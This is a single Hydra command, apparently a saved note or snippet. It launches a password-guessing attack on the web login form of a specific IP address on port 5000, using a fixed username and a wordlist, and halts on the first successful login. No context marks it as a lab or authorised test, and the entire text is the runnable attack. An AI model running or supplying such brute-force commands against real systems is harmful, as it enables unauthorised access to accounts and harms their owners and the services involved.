hydra -l fubsi -P pw.txt 141.87.60.46 http-post-form \
"/login:username=^USER^&password=^PASS^:F=Bad Request" -s 5000 -f





